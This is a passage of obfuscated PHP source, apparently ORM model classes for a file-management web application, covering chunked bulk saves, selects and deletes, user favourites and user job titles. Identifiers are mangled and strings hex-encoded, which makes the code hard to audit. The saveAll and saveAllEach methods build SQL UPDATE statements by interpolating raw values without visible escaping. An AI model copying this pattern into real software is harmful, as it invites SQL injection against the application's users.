(!$¥·ò²Ë­[$Ä’¸¹Æ]) { unset($¥·ò²Ë­[$Ä’¸¹Æ]); } break; } if (isset($¥·ò²Ë­[$Ä’¸¹Æ])) { array_unshift($’úØÏğ‘, $¥·ò²Ë­[$Ä’¸¹Æ]); } if ($êÂ•®©„[399] == $£ş‰­à’[3]) { $¥·ò²Ë­[$Ä’¸¹Æ] = call_user_func_array($îùñèğ¡, $’úØÏğ‘); } else { $¥·ò²Ë­[$Ä’¸¹Æ] = call_user_func_array(array(&$this, $îùñèğ¡), $’úØÏğ‘); } break; case $êÂ•®©„[350]: if (isset($¥·ò²Ë­[$Ä’¸¹Æ]) && $¥·ò²Ë­[$Ä’¸¹Æ]) { $¥·ò²Ë­[$Ä’¸¹Æ] = call_user_func_array(array(&$this, $£ş‰­à’[1]), array($¥·ò²Ë­[$Ä’¸¹Æ])); } break; case $êÂ•®©„[353]: $¥·ò²Ë­[$Ä’¸¹Æ] = $¥·ò²Ë­[$£ş‰­à’[1]]; break; case $êÂ•®©„[372]: if (isset($¥·ò²Ë­[$Ä’¸¹Æ]) && !is_string($¥·ò²Ë­[$Ä’¸¹Æ])) { $¥·ò²Ë­[$Ä’¸¹Æ] = json_encode_force($¥·ò²Ë­[$Ä’¸¹Æ]); } break; case $êÂ•®©„[401]: if ($¥·ò²Ë­[$Ä’¸¹Æ] === $êÂ•®©„[12]) { unset($¥·ò²Ë­[$Ä’¸¹Æ]); } break; case $êÂ•®©„[402]: $¥·ò²Ë­[$Ä’¸¹Æ] = $£ş‰­à’[1]; default: break; } } if ($Ä‡û¹ŞÆ == $êÂ•®©„[433]) { $¾š…†À¹ = strtolower($this->db->getDbType()); if (strpos($¾š…†À¹, $êÂ•®©„[13]) !== 0) { return; } $ûÕ¬ü = $this->field(!0)->fields; $›èŸÙÂ = $ûÕ¬ü[$êÂ•®©„[332]]; if (isset($ûÕ¬ü[$êÂ•®©„[331]])) { unset($›èŸÙÂ[$ûÕ¬ü[$êÂ•®©„[331]]]); } foreach ($›èŸÙÂ as $êóÓß©‹ => $Ä‡û¹ŞÆ) { if (!isset($¥·ò²Ë­[$êóÓß©‹])) { $¥·ò²Ë­[$êóÓß©‹] = $êÂ•®©„[12]; } } } } private function dataAfterFilter(&$øü‡‰…) { $—œ•‘£í =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($this->dataAuto as $Š†æÜ­“) { $„óÄßŠ© = $Š†æÜ­“[0]; if (!isset($øü‡‰…[$„óÄßŠ©])) { continue; } if (!in_array($—œ•‘£í[435], explode($—œ•‘£í[50], $Š†æÜ­“[2]))) { continue; } switch (trim($Š†æÜ­“[3])) { case $—œ•‘£í[399]: case $—œ•‘£í[400]: $ã·˜ÆâÂ = isset($Š†æÜ­“[4]) ? (array) $Š†æÜ­“[4] : array(); array_unshift($ã·˜ÆâÂ, $øü‡‰…[$„óÄßŠ©]); if (isset($Š†æÜ­“[4]) && $Š†æÜ­“[4] == $—œ•‘£í[456]) { $ã·˜ÆâÂ = array($øü‡‰…[$„óÄßŠ©]); } if ($—œ•‘£í[399] == $Š†æÜ­“[3]) { $øü‡‰…[$„óÄßŠ©] = call_user_func_array($Š†æÜ­“[1], $ã·˜ÆâÂ); } else { $øü‡‰…[$„óÄßŠ©] = call_user_func_array(array(&$this, $Š†æÜ­“[1]), $ã·˜ÆâÂ); } break; case $—œ•‘£í[350]: if (isset($øü‡‰…[$„óÄßŠ©]) && $øü‡‰…[$„óÄßŠ©]) { $øü‡‰…[$„óÄßŠ©] = call_user_func_array(array(&$this, $Š†æÜ­“[1]), array($øü‡‰…[$„óÄßŠ©])); } break; case $—œ•‘£í[353]: $øü‡‰…[$„óÄßŠ©] = $øü‡‰…[$Š†æÜ­“[1]]; break; case $—œ•‘£í[372]: $ş¥ıÍÛì = $øü‡‰…[$„óÄßŠ©]; $øü‡‰…[$„óÄßŠ©] = json_decode($ş¥ıÍÛì, !0); if (is_null($øü‡‰…[$„óÄßŠ©])) { $øü‡‰…[$„óÄßŠ©] = $ş¥ıÍÛì; } break; case $—œ•‘£í[401]: if ($øü‡‰…[$„óÄßŠ©] === $—œ•‘£í[12]) { unset($øü‡‰…[$„óÄßŠ©]); } break; case $—œ•‘£í[402]: $øü‡‰…[$„óÄßŠ©] = $Š†æÜ­“[1]; break; default: break; } } } public function saveAll($ôİô¶Èş) { $ÄÂÆŸİº =& $_SERVER[¼¥ÊĞÙÌ]; $ñÙ¤¾Í¢ = $this->tablePrefix . $this->tableName; $ºü¼²Öú = self::SQL_WHERE_IN_CHUNK; $ôİô¶Èş = is_array($ôİô¶Èş) ? $ôİô¶Èş : array(); $š†µúƒÀ = $ÄÂÆŸİº[457]; $‡šƒÍœ = 0; $¸¼ğìïÚ = array(); $ä¾”×Üœ = count($ôİô¶Èş); for ($€Åñôªß = 0; $€Åñôªß < $ä¾”×Üœ; $€Åñôªß++) { $…şü”£º = $ôİô¶Èş[$€Åñôªß]; if (!is_array($…şü”£º) || count($…şü”£º) != 4) { continue; } $Ë±‘ìÓ¢ = "\x55\120\104\x41\124\x45\x20\140{$ñÙ¤¾Í¢}\140\x20\x53\x45\124\40{$…şü”£º[2]}\x20\x3d\40\x43\101\x53\105\40{$…şü”£º[0]}\x20\12"; if ($‡šƒÍœ == 0) { $š†µúƒÀ = $Ë±‘ìÓ¢; } $¸¼ğìïÚ[] = $ÄÂÆŸİº[121] . $…şü”£º[1] . $ÄÂÆŸİº[121]; $‡šƒÍœ++; $š†µúƒÀ .= "\40\127\x48\x45\x4e\40\x27{$…şü”£º[1]}\47\40\124\110\x45\x4e\40\x27{$…şü”£º[3]}\47\40\xa"; if ($‡šƒÍœ == $ºü¼²Öú || $€Åñôªß == $ä¾”×Üœ - 1) { $Ò»§Ô = implode($ÄÂÆŸİº[50], $¸¼ğìïÚ); $š†µúƒÀ .= "\40\105\x4e\104\x20\x20\x57\110\105\x52\105\x20{$…şü”£º[0]}\40\x49\116\40\50{$Ò»§Ô}\x29\40"; $this->execute($š†µúƒÀ); $‡šƒÍœ = 0; $š†µúƒÀ = $Ë±‘ìÓ¢; $this->chunkEventCheck(count($¸¼ğìïÚ)); $¸¼ğìïÚ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¨ÔÌÓÜ¨) { $ş„¾½„ =& $_SERVER[¼¥ÊĞÙÌ]; $Š£¾ÏøÎ = $this->tablePrefix . $this->tableName; foreach ($¨ÔÌÓÜ¨ as $ĞæáÂÉÊ) { if (!is_array($ĞæáÂÉÊ) || count($ĞæáÂÉÊ) != 4) { continue; } $ÁûÑèÅ© = $ĞæáÂÉÊ[0] . $ş„¾½„[458] . $ĞæáÂÉÊ[1] . $ş„¾½„[121]; $–¡ÂóëÚ = $ĞæáÂÉÊ[2] . $ş„¾½„[458] . $ĞæáÂÉÊ[3] . $ş„¾½„[121]; $â’Ğé¢ = "\165\160\x64\141\x74\x65\40{$Š£¾ÏøÎ}\40\163\x65\x74\40{$–¡ÂóëÚ}\x20\167\150\x65\162\145\40{$ÁûÑèÅ©}\73"; $this->execute($â’Ğé¢); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($æ©¿Îõ® = false, $•ë®ş¿½ = false) { $this->_chunkEvent = $æ©¿Îõ®; $this->_chunkEventParam = $•ë®ş¿½; } private function chunkEventCheck($ÉÃ²—àı) { if (!$this->_chunkEvent) { return; } $½ãÎ›Û = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $½ãÎ›Û[$_SERVER[¼¥ÊĞÙÌ][459]] = $ÉÃ²—àı; Hook::trigger($this->_chunkEvent, $½ãÎ›Û); } public function addAll($Š©Í´ÌÜ, $×ÊëŞ½ = array(), $ÂÍÃæ”¿ = false) { $ö§Éççş =& $_SERVER[¼¥ÊĞÙÌ]; ignore_timeout(); $ó™Ú…™Ï = self::SQL_WHERE_IN_CHUNK; if (empty($Š©Í´ÌÜ)) { $this->error = think_lang($ö§Éççş[351]); return !1; } $×ÊëŞ½ = $this->_parseOptions($×ÊëŞ½); foreach ($Š©Í´ÌÜ as $¥áìò’ã => $–»È‰ëØ) { $Š©Í´ÌÜ[$¥áìò’ã] = $this->_facade($–»È‰ëØ); $this->_beforeInsert($Š©Í´ÌÜ[$¥áìò’ã], $×ÊëŞ½); } if (method_exists($this->db, $ö§Éççş[352])) { for ($¬¤İ€¿º = 0; $¬¤İ€¿º < count($Š©Í´ÌÜ); $¬¤İ€¿º += $ó™Ú…™Ï) { $÷ÍŠÜè‘ = array_slice($Š©Í´ÌÜ, $¬¤İ€¿º, $ó™Ú…™Ï); if (!is_array($÷ÍŠÜè‘) || count($÷ÍŠÜè‘) == 0) { break; } $ú§ó»©Ş = $this->db->insertAll($÷ÍŠÜè‘, $×ÊëŞ½, $ÂÍÃæ”¿); $this->chunkEventCheck(count($÷ÍŠÜè‘)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Š©Í´ÌÜ as $¥áìò’ã => $–»È‰ëØ) { $ú§ó»©Ş = $this->db->insert($–»È‰ëØ, $×ÊëŞ½, $ÂÍÃæ”¿); } $this->commit(); } if (!1 !== $ú§ó»©Ş) { $Ç»—ïµÑ = $this->getLastInsID(); if ($Ç»—ïµÑ) { return $Ç»—ïµÑ; } } return $ú§ó»©Ş; } public function save($º­¤„™ = '', $¸±¡âª = array()) { $ÁÃòèú =& $_SERVER[¼¥ÊĞÙÌ]; $¥°’öæ£ = self::SQL_WHERE_IN_CHUNK; $©š¸¶Å† = $this->optionsValue(); $ÍØØá×¦ = $this->findWhereField($©š¸¶Å†); if (!$ÍØØá×¦) { return parent::save($º­¤„™, $¸±¡âª); } $£–Ôäû÷ = 0; $æÂªÌ = $©š¸¶Å†[$ÁÃòèú[355]][$ÍØØá×¦][1]; $æÂªÌ = is_array($æÂªÌ) ? $æÂªÌ : array(); $á¿…ğÈÉ = count($æÂªÌ); for ($Æ¶îƒ«¬ = 0; $Æ¶îƒ«¬ < $á¿…ğÈÉ; $Æ¶îƒ«¬ += $¥°’öæ£) { $¹ö„§· = array_slice($æÂªÌ, $Æ¶îƒ«¬, $¥°’öæ£); if (!is_array($¹ö„§·) || count($¹ö„§·) == 0) { break; } $©š¸¶Å†[$ÁÃòèú[355]][$ÍØØá×¦][1] = $¹ö„§·; $this->optionsValue($©š¸¶Å†); $£–Ôäû÷ += parent::save($º­¤„™, $¸±¡âª); $this->chunkEventCheck(count($¹ö„§·)); } $this->chunkEventSet(); return $£–Ôäû÷; } public function add($¾Ë°Š¼ = '', $ÓçÍÆ÷½ = array(), $’–·ÔÓá = false) { if ($this->addTaskStatus && is_array($¾Ë°Š¼)) { $this->addTaskData[] = $¾Ë°Š¼; return; } return parent::add($¾Ë°Š¼, $ÓçÍÆ÷½, $’–·ÔÓá); } public function parseWhereLike($ê°›û¤, $ÃÕôê…º = '', $æá®‚ùĞ = false, &$ØÀ…Æé = false) { $É‚¦İ´‚ =& $_SERVER[¼¥ÊĞÙÌ]; $«¤çÔ = $GLOBALS[$É‚¦İ´‚[6]][$É‚¦İ´‚[460]]; if (!$«¤çÔ[$É‚¦İ´‚[461]]) { return $ê°›û¤; } if (!is_array($ê°›û¤)) { return $ê°›û¤; } $ê¸ñ¾ò‚ = array(); $ÚÉã±ß´ = 0; foreach ($ê°›û¤ as $å¹ÙèÉ° => $Ôúêì¥ß) { if (is_array($Ôúêì¥ß) && count($Ôúêì¥ß) == 2 && $Ôúêì¥ß[0] == $É‚¦İ´‚[462] && is_string($Ôúêì¥ß[1]) && substr($Ôúêì¥ß[1], 0, 1) == $É‚¦İ´‚[463] && substr($Ôúêì¥ß[1], strlen($Ôúêì¥ß[1]) - 1, 1) == $É‚¦İ´‚[463]) { $ØÀ…Æé = !0; $Ï§®›òÆ = is_string($å¹ÙèÉ°) ? $å¹ÙèÉ° : $ÃÕôê…º; $ì³óµŸÛ = substr($Ôúêì¥ß[1], 1, strlen($Ôúêì¥ß[1]) - 2); $ì³óµŸÛ = $this->db->escapeString($ì³óµŸÛ); if (!strpos($Ï§®›òÆ, $É‚¦İ´‚[10])) { $Ï§®›òÆ = $É‚¦İ´‚[464] . $Ï§®›òÆ . $É‚¦İ´‚[464]; } $å¬¼—®£ = $É‚¦İ´‚[223] . $ì³óµŸÛ . $É‚¦İ´‚[223]; $ì³óµŸÛ = str_replace(array($É‚¦İ´‚[10], $É‚¦İ´‚[465], $É‚¦İ´‚[11]), $É‚¦İ´‚[466], $ì³óµŸÛ); if ($«¤çÔ[$É‚¦İ´‚[467]]) { $å¬¼—®£ = $É‚¦İ´‚[468] . $ì³óµŸÛ . $É‚¦İ´‚[469]; if ($«¤çÔ[$É‚¦İ´‚[470]]) { $å¬¼—®£ = $É‚¦İ´‚[469] . $ì³óµŸÛ . $É‚¦İ´‚[468]; } } $ê¸ñ¾ò‚[$ÚÉã±ß´] = $É‚¦İ´‚[471] . $Ï§®›òÆ . $É‚¦İ´‚[472] . $å¬¼—®£ . $É‚¦İ´‚[473]; $ÚÉã±ß´++; continue; } if (is_array($Ôúêì¥ß)) { $ÃÕôê…º = is_string($å¹ÙèÉ°) ? $å¹ÙèÉ° : $ÃÕôê…º; $Ôúêì¥ß = $this->parseWhereLike($Ôúêì¥ß, $ÃÕôê…º, !0, $ØÀ…Æé); } if (is_numeric($å¹ÙèÉ°)) { $ê¸ñ¾ò‚[$ÚÉã±ß´] = $Ôúêì¥ß; $ÚÉã±ß´++; } else { $ê¸ñ¾ò‚[$å¹ÙèÉ°] = $Ôúêì¥ß; } } if ($ØÀ…Æé && !$æá®‚ùĞ) { } return $ê¸ñ¾ò‚; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¥õ“…½Ú = array()) { $¿ê—‡µ× =& $_SERVER[¼¥ÊĞÙÌ]; $…ŒŠÍŒ = self::SQL_WHERE_IN_CHUNK; $ÑçØšØÏ = $this->optionsValue(); $Ê½õŠÑŞ = $this->findWhereField($ÑçØšØÏ); if (!$Ê½õŠÑŞ || isset($ÑçØšØÏ[$¿ê—‡µ×[370]]) || isset($ÑçØšØÏ[$¿ê—‡µ×[431]])) { return parent::select($¥õ“…½Ú); } $Ü÷É ô… = $ÑçØšØÏ[$¿ê—‡µ×[355]][$Ê½õŠÑŞ][1]; $Ü÷É ô… = is_array($Ü÷É ô…) ? $Ü÷É ô… : array(); $°®ğ‚å = null; for ($¯Ïª×ìË = 0; $¯Ïª×ìË < count($Ü÷É ô…); $¯Ïª×ìË += $…ŒŠÍŒ) { $¼¹±õ¾® = array_slice($Ü÷É ô…, $¯Ïª×ìË, $…ŒŠÍŒ); if (!is_array($¼¹±õ¾®) || count($¼¹±õ¾®) == 0) { break; } $ÑçØšØÏ[$¿ê—‡µ×[355]][$Ê½õŠÑŞ][1] = $¼¹±õ¾®; $this->optionsValue($ÑçØšØÏ); $—‘¶‚ŞÀ = parent::select($¥õ“…½Ú); if (!$—‘¶‚ŞÀ) { continue; } $°®ğ‚å = is_array($°®ğ‚å) ? $°®ğ‚å : array(); $°®ğ‚å = array_merge($°®ğ‚å, $—‘¶‚ŞÀ); } return $°®ğ‚å; } public function delete($®óÊ¨‰Â = array()) { $Œú®ıœï =& $_SERVER[¼¥ÊĞÙÌ]; $ÜüÈÔ™  = self::SQL_WHERE_IN_CHUNK; $¤’ Ğç = $this->optionsValue(); $ò×»€Ù = $this->findWhereField($¤’ Ğç); if (!$ò×»€Ù) { return parent::delete($®óÊ¨‰Â); } $·‡‹ö• = 0; $†Õóì·ù = $¤’ Ğç[$Œú®ıœï[355]][$ò×»€Ù][1]; $†Õóì·ù = is_array($†Õóì·ù) ? $†Õóì·ù : array(); for ($åÛ¯ˆ÷ = 0; $åÛ¯ˆ÷ < count($†Õóì·ù); $åÛ¯ˆ÷ += $ÜüÈÔ™ ) { $ÌÕ‰ç = array_slice($†Õóì·ù, $åÛ¯ˆ÷, $ÜüÈÔ™ ); if (!is_array($ÌÕ‰ç) || count($ÌÕ‰ç) == 0) { break; } $¤’ Ğç[$Œú®ıœï[355]][$ò×»€Ù][1] = $ÌÕ‰ç; $this->optionsValue($¤’ Ğç); $·‡‹ö• += parent::delete($®óÊ¨‰Â); } return $·‡‹ö•; } private function findWhereField($£É¢ú›´) { $É›ŠÃŸ =& $_SERVER[¼¥ÊĞÙÌ]; $›îËàÔñ = self::SQL_WHERE_IN_CHUNK; if (!is_array($£É¢ú›´) || !is_array($£É¢ú›´[$É›ŠÃŸ[355]])) { return !1; } foreach ($£É¢ú›´[$É›ŠÃŸ[355]] as $ı§ùÁâ => $óêßîèÄ) { if (is_array($óêßîèÄ) && isset($óêßîèÄ[0]) && is_string($óêßîèÄ[0]) && strtolower($óêßîèÄ[0]) == $É›ŠÃŸ[7] && is_array($óêßîèÄ[1]) && count($óêßîèÄ[1]) > $›îËàÔñ) { ignore_timeout(); return $ı§ùÁâ; } } return !1; } public function setMasterDB($®áÛÑó° = true) { think_config($_SERVER[¼¥ÊĞÙÌ][474], $®áÛÑó°); } } goto EÑÜ§¹ŒÖ¿; c©ÚĞ¢Ê‘Û: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($ÂõÀÊ) { $÷å¦£ä† =& $_SERVER[¼¥ÊĞÙÌ]; return array($÷å¦£ä†[2107] => array(USER_ID, $÷å¦£ä†[2484])); } protected function listData() { $µ‹œî· =& $_SERVER[¼¥ÊĞÙÌ]; $Û¾‘‚øŞ = array($µ‹œî·[1781] => USER_ID, $µ‹œî·[562] => 0); $Øº™¬ƒ = $µ‹œî·[2485]; $ØØÜ‚ß¿ = $this->field($Øº™¬ƒ)->where($Û¾‘‚øŞ)->order($µ‹œî·[2486])->select(); return $ØØÜ‚ß¿ ? $ØØÜ‚ß¿ : array(); } protected function resetCache() { } protected function listView() { $ÄŸ¾ğ³ =& $_SERVER[¼¥ÊĞÙÌ]; $‹‡üğ¿‰ = $this->listData(); $¸—•ÕŒâ = array_filter_by_field($‹‡üğ¿‰, $ÄŸ¾ğ³[33], $ÄŸ¾ğ³[493]); $Ç¶«Ê»Ó = array_to_keyvalue($¸—•ÕŒâ, $ÄŸ¾ğ³[12], $ÄŸ¾ğ³[87]); if (!$Ç¶«Ê»Ó) { return $‹‡üğ¿‰; } $¸ƒßÉº = 2000; $îøè‡¹£ = array($ÄŸ¾ğ³[494] => array($ÄŸ¾ğ³[495], $Ç¶«Ê»Ó)); $Û˜”´ìÏ = Model($ÄŸ¾ğ³[904])->listSource($îøè‡¹£, $¸ƒßÉº); $Û˜”´ìÏ = array_merge($Û˜”´ìÏ[$ÄŸ¾ğ³[86]], $Û˜”´ìÏ[$ÄŸ¾ğ³[85]]); $Û˜”´ìÏ = array_to_keyvalue($Û˜”´ìÏ, $ÄŸ¾ğ³[194]); foreach ($‹‡üğ¿‰ as $çŠ¯æœú => $Éæ•âØã) { $Ù‹æ·‘ = $Û˜”´ìÏ[$Éæ•âØã[$ÄŸ¾ğ³[87]]]; $Ù‹æ·‘ = $Ù‹æ·‘ ? $Ù‹æ·‘ : array(); $‹‡üğ¿‰[$çŠ¯æœú] = array_merge($Ù‹æ·‘, $Éæ•âØã); } return $‹‡üğ¿‰; } protected function addFav($Ø…à œ±, $…ø¶çñ° = '', $ØŸßû·Õ = "\x73\157\165\x72\x63\145") { $Ğî›Ô£Ç =& $_SERVER[¼¥ÊĞÙÌ]; $ƒ›È¼ = array($Ğî›Ô£Ç[1781] => USER_ID, $Ğî›Ô£Ç[562] => 0, $Ğî›Ô£Ç[499] => $ØŸßû·Õ, $Ğî›Ô£Ç[498] => $Ø…à œ±); if ($this->where($ƒ›È¼)->find()) { return !1; } $ƒ›È¼ = array($Ğî›Ô£Ç[1781] => USER_ID, $Ğî›Ô£Ç[562] => 0); $çôê‘¤Ú = $this->where($ƒ›È¼)->max($Ğî›Ô£Ç[2015]); if (!$çôê‘¤Ú) { $çôê‘¤Ú = 0; } if (!$…ø¶çñ° && $ØŸßû·Õ == $Ğî›Ô£Ç[493]) { $ĞÔ¤±ãô = Model($Ğî›Ô£Ç[1440])->where(array($Ğî›Ô£Ç[494] => $Ø…à œ±))->find(); if (!$ĞÔ¤±ãô) { return !1; } $…ø¶çñ° = $ĞÔ¤±ãô[$Ğî›Ô£Ç[32]]; } $…ø¶çñ° = $this->getAutoName($…ø¶çñ°); $ˆ÷Ãİ»» = array($Ğî›Ô£Ç[1781] => USER_ID, $Ğî›Ô£Ç[562] => 0, $Ğî›Ô£Ç[497] => $…ø¶çñ°, $Ğî›Ô£Ç[498] => $Ø…à œ±, $Ğî›Ô£Ç[499] => $ØŸßû·Õ, $Ğî›Ô£Ç[1995] => $çôê‘¤Ú + 1); return $this->add($ˆ÷Ãİ»»); } protected function remove($•Èñ‰•Ğ) { $¯í§›… =& $_SERVER[¼¥ÊĞÙÌ]; $¸º·§åÊ = array($¯í§›…[1781] => USER_ID, $¯í§›…[496] => $•Èñ‰•Ğ); return $this->where($¸º·§åÊ)->delete(); } protected function removeByName($°Å¯‡ç) { $à§Œé° =& $_SERVER[¼¥ÊĞÙÌ]; $‚úü¾š‹ = array($à§Œé°[1781] => USER_ID, $à§Œé°[497] => $°Å¯‡ç, $à§Œé°[562] => 0); return $this->where($‚úü¾š‹)->delete(); } protected function rename($µŞãÎ·—, $£¢”“ç) { $¹Ù ¡şø =& $_SERVER[¼¥ÊĞÙÌ]; if ($µŞãÎ·— == $£¢”“ç) { return !1; } $ú©ÈÂÈ… = $this->getAutoName($£¢”“ç); if ($£¢”“ç != $ú©ÈÂÈ…) { return !1; } $§ù­Å‘ = array($¹Ù ¡şø[1781] => USER_ID, $¹Ù ¡şø[562] => 0, $¹Ù ¡şø[32] => $µŞãÎ·—); return $this->where($§ù­Å‘)->save(array($¹Ù ¡şø[32] => $£¢”“ç)); } protected function resetSort($¨Æˆ†) { $ê‹ßÍ¥Û =& $_SERVER[¼¥ÊĞÙÌ]; $¨Æˆ† = is_array($¨Æˆ†) ? $¨Æˆ† : array(); $ªèş†Ò³ = array($ê‹ßÍ¥Û[1781] => USER_ID); for ($œõ­´æ© = 0; $œõ­´æ© < count($¨Æˆ†); $œõ­´æ©++) { $ªèş†Ò³[$ê‹ßÍ¥Û[496]] = $¨Æˆ†[$œõ­´æ©]; $this->where($ªèş†Ò³)->save(array($ê‹ßÍ¥Û[1995] => $œõ­´æ© + 1)); } return !0; } protected function moveTop($åĞ•Ô¼) { $ıÕŠ¦õë =& $_SERVER[¼¥ÊĞÙÌ]; $±Û‚© = array($ıÕŠ¦õë[1781] => USER_ID, $ıÕŠ¦õë[562] => 0); $¹ŸúíòÜ = $this->where($±Û‚©)->where(array($ıÕŠ¦õë[32] => $åĞ•Ô¼))->find(); if (!$¹ŸúíòÜ) { return; } $™çŒô”ê = $this->field($ıÕŠ¦õë[478])->where($±Û‚©)->order($ıÕŠ¦õë[2486])->select(); $™çŒô”ê = array_to_keyvalue($™çŒô”ê, $ıÕŠ¦õë[12], $ıÕŠ¦õë[478]); $ÔÈ£Ò–Ì = $™çŒô”ê; $™çŒô”ê = array_remove_value($™çŒô”ê, $¹ŸúíòÜ[$ıÕŠ¦õë[478]]); array_unshift($™çŒô”ê, $¹ŸúíòÜ[$ıÕŠ¦õë[478]]); return $this->resetSort($™çŒô”ê); } protected function moveBottom($í¢·Ş¼ú) { $äÀá›­  =& $_SERVER[¼¥ÊĞÙÌ]; $ìÇäİ  = array($äÀá›­ [1781] => USER_ID, $äÀá›­ [562] => 0); $Ñ‰¨ã¬ = $this->where($ìÇäİ )->max($äÀá›­ [2015]); $…«¤±¼¢ = array($äÀá›­ [2015] => $Ñ‰¨ã¬ + 1); return $this->where($ìÇäİ )->where(array($äÀá›­ [32] => $í¢·Ş¼ú))->save($…«¤±¼¢); } private function getAutoName($×¶ù›õ) { $«ı¯©»Ş =& $_SERVER[¼¥ÊĞÙÌ]; $Ñêú¥ˆƒ = array($«ı¯©»Ş[1781] => USER_ID, $«ı¯©»Ş[562] => 0); $ïüşÎ‹ò = $this->field($«ı¯©»Ş[32])->where($Ñêú¥ˆƒ)->select(); $ïüşÎ‹ò = array_to_keyvalue($ïüşÎ‹ò, $«ı¯©»Ş[12], $«ı¯©»Ş[32]); if (!$ïüşÎ‹ò || !in_array($×¶ù›õ, $ïüşÎ‹ò)) { return $×¶ù›õ; } for ($ÂÏÆœõ = 0; $ÂÏÆœõ < count($ïüşÎ‹ò); $ÂÏÆœõ++) { if (!in_array($×¶ù›õ . "\x28{$ÂÏÆœõ}\x29", $ïüşÎ‹ò)) { return $×¶ù›õ . "\50{$ÂÏÆœõ}\x29"; } } return $×¶ù›õ . "\50{$ÂÏÆœõ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x6a\157\142\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\144\145\x73\x63", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\146\112\157\142\x4c\x69\x73\x74"; public function listData($–²¬¥óô = false, $ã¶‹’ÓŠ = "\x73\x6f\162\x74", $æ™à£İİ = false) { return parent::listData($–²¬¥óô, $ã¶‹’ÓŠ, $æ™à£İİ); } public function remove($ÆõÕ‹¶Á) { return parent::remove($ÆõÕ‹¶Á); } public function add($¶ŠöÍœ) { $î´ö£ò =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->findByName($¶ŠöÍœ[$î´ö£ò[32]])) { return !1; } $¶ŠöÍœ[$î´ö£ò[2015]] = $this->getSort(); return parent::insert($¶ŠöÍœ); } private function getSort() { $üê°šœÜ =& $_SERVER[¼¥ÊĞÙÌ]; $¿Öˆ‹¹Î = parent::listData(); $ÍÜÑŒ¥ = array_to_keyvalue($¿Öˆ‹¹Î, $üê°šœÜ[12], $üê°šœÜ[2015]); return empty($ÍÜÑŒ¥) ? 0 : max($ÍÜÑŒ¥) + 1; } public function update($îÔ¯â‹, $œÚ¹ŒÒ) { $®åÒšÀ¸ =& $_SERVER[¼¥ÊĞÙÌ]; $ÄÓ¬é«Ç = parent::listData($îÔ¯â‹); $¦Üõ¤ = $this->findByName($œÚ¹ŒÒ[$®åÒšÀ¸[32]]); if (!$ÄÓ¬é«Ç || $¦Üõ¤ && $¦Üõ¤[$®åÒšÀ¸[478]] != $ÄÓ¬é«Ç[$®åÒšÀ¸[478]]) { return !1; } return parent::update($îÔ¯â‹, $œÚ¹ŒÒ); } public function setUserJob($Æ¯Å€£Ì, $ÒïëÊµÈ) { $¬“ó¸‘… =& $_SERVER[¼¥ÊĞÙÌ]; if (!is_array($ÒïëÊµÈ)) { $ÒïëÊµÈ = array($ÒïëÊµÈ); } $Ú‡®íó÷ = parent::listData(); $ˆ»ôÙï¯ = array_to_keyvalue($Ú‡®íó÷, $¬“ó¸‘…[32]); $òÙÉâçæ = $¬“ó¸‘…[457]; foreach ($ÒïëÊµÈ as $éé³·ŠŠ) { if ($ˆ»ôÙï¯[$éé³·ŠŠ]) { $òÙÉâçæ .= $ˆ»ôÙï¯[$éé³·ŠŠ][$¬“ó¸‘…[478]] . $¬“ó¸‘…[50]; } else { $ÓéèüÎî = $this->add($éé³·ŠŠ); $òÙÉâçæ .= $ÓéèüÎî . $¬“ó¸‘…[50]; } } $òÙÉâçæ = rtrim($òÙÉâçæ, $¬“ó¸‘…[50]); Model($¬“ó¸‘…[602])->metaSet($Æ¯Å€£Ì, self::JOB_KEY, $òÙÉâçæ); } public function getUserJob($‹Ğ„âØ‚) { $†ÕîÒõ = Model($_SERVER[¼¥ÊĞÙÌ][602])->metaGet($‹Ğ„âØ‚); return $this->getUserJobInfo($†ÕîÒõ[self::JOB_KEY]); } public function getUserJobInfo($Ç»”ÅôŸ) { $¹Ü˜é =& $_SERVER[¼¥ÊĞÙÌ]; $šÒ´Ş = explode($¹Ü˜é[50], $Ç»”ÅôŸ); $¥ÉÙŞ´ë = parent::listData(); $¥ÉÙŞ´ë = array_remove_key($¥ÉÙŞ´ë, $¹Ü˜é[234]); $‘•÷²Œ = array(); foreach ($šÒ´Ş as $Ç‰‰¯‰¤) { if (isset($¥ÉÙŞ´ë[$Ç‰‰¯‰¤])) { $‘•÷²Œ[] = $¥ÉÙŞ´ë[$Ç‰‰¯‰¤]; } } return $‘•÷²Œ; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\x65" => "\x75\x73\x65\162\x5f\x6d\145\164\141", "\x6d\145\164\x61\106\151\x65\154\144" => "\165\163\x65\162\111\x44"); protected $simpleField = "\165\163\x65\x72\111\104\x2c\x6e\151\143\153\x4e\141\155\x65\x2c\x6e\141\x6d\x65\54\x61\x76\141\x74\141\x72\x2c\163\x65\170\x2c\163\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ş˜¬’Êª) { $Í¹ØïÜâ =& $_SERVER[¼¥ÊĞÙÌ]; $ÇŠ‚…ÂŠ = $Í¹ØïÜâ[2487]; return array($Í¹ØïÜâ[2073] => array($Ş˜¬’Êª[0], $ÇŠ‚…ÂŠ), $Í¹ØïÜâ[2075] => array($Ş˜¬’Êª[0], $ÇŠ‚…ÂŠ), 